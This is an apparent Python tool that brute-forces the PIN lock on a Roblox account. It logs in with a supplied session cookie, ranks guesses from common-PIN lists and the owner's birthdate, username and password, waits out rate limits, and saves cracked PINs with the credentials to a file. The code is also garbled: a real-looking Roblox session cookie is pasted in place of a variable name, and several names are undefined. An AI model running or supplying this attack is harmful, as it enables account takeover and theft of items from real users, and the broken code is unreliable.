import os, time, requests
from threading import Thread
from datetime import datetime

credentials = input('Enter the account user:pass:cookie or _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A764D3545F6A573A3D63EBED03430B8658C69CCEBAFBDA2B2BDB1DFABB5C3C5ACBE4EDB5EAB8579A3BE2EFA61310A3E1DE622AFC3786F1A4C5AFC84F8E9A08A56F54628097356E66F134B93F0F7B844C781A1E47464A89836D231DB5161F4FA73B569DA493E57DB454803F02012CC917C802BE02268A68ECB758398B4FA477D78430B91275758D0D5EBC70DFF9BFB9F91CFC6791500ACA0FDD6EC245179B59F39D899A5BFC2DF16D9EE1DEAA2542D636D8045DBE7832A6308A90299072DCFDC1B4F16C32E465ABB48D21C18B9515F8BBC82E60DD42A2565531288A5BF8AF940A8B01116C576E5815A7B10F6A0868580588E04AE16812CAA57B4D463F138B7EB7FF360D243C876E6F1DED586129B8A2C49A6CB1272A943EB45C7973E8EA35A1F82FB3FE62CD17746FB621D3A2FCB74431A124B0D5D3CE8E8655C2CABF258C28E4D491E8D6ABFAABE29465F1A8F11A15CCC7156F3D647BE73F802365F190396E6500CC88802E95FCB984DE74D447F7DADF0CB25934D7F26F2443780D13CF83038E077B939D ~ ')
if credentials.count(':') >= 2:
    username, password, _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A764D3545F6A573A3D63EBED03430B8658C69CCEBAFBDA2B2BDB1DFABB5C3C5ACBE4EDB5EAB8579A3BE2EFA61310A3E1DE622AFC3786F1A4C5AFC84F8E9A08A56F54628097356E66F134B93F0F7B844C781A1E47464A89836D231DB5161F4FA73B569DA493E57DB454803F02012CC917C802BE02268A68ECB758398B4FA477D78430B91275758D0D5EBC70DFF9BFB9F91CFC6791500ACA0FDD6EC245179B59F39D899A5BFC2DF16D9EE1DEAA2542D636D8045DBE7832A6308A90299072DCFDC1B4F16C32E465ABB48D21C18B9515F8BBC82E60DD42A2565531288A5BF8AF940A8B01116C576E5815A7B10F6A0868580588E04AE16812CAA57B4D463F138B7EB7FF360D243C876E6F1DED586129B8A2C49A6CB1272A943EB45C7973E8EA35A1F82FB3FE62CD17746FB621D3A2FCB74431A124B0D5D3CE8E8655C2CABF258C28E4D491E8D6ABFAABE29465F1A8F11A15CCC7156F3D647BE73F802365F190396E6500CC88802E95FCB984DE74D447F7DADF0CB25934D7F26F2443780D13CF83038E077B939D = credentials.split(':',2)
else:
    username, password, _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A764D3545F6A573A3D63EBED03430B8658C69CCEBAFBDA2B2BDB1DFABB5C3C5ACBE4EDB5EAB8579A3BE2EFA61310A3E1DE622AFC3786F1A4C5AFC84F8E9A08A56F54628097356E66F134B93F0F7B844C781A1E47464A89836D231DB5161F4FA73B569DA493E57DB454803F02012CC917C802BE02268A68ECB758398B4FA477D78430B91275758D0D5EBC70DFF9BFB9F91CFC6791500ACA0FDD6EC245179B59F39D899A5BFC2DF16D9EE1DEAA2542D636D8045DBE7832A6308A90299072DCFDC1B4F16C32E465ABB48D21C18B9515F8BBC82E60DD42A2565531288A5BF8AF940A8B01116C576E5815A7B10F6A0868580588E04AE16812CAA57B4D463F138B7EB7FF360D243C876E6F1DED586129B8A2C49A6CB1272A943EB45C7973E8EA35A1F82FB3FE62CD17746FB621D3A2FCB74431A124B0D5D3CE8E8655C2CABF258C28E4D491E8D6ABFAABE29465F1A8F11A15CCC7156F3D647BE73F802365F190396E6500CC88802E95FCB984DE74D447F7DADF0CB25934D7F26F2443780D13CF83038E077B939D = '', '', credentials
os.system('cls')

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print('Logged in to', ceoofbeingalex)
except:
    input('INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print('Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()
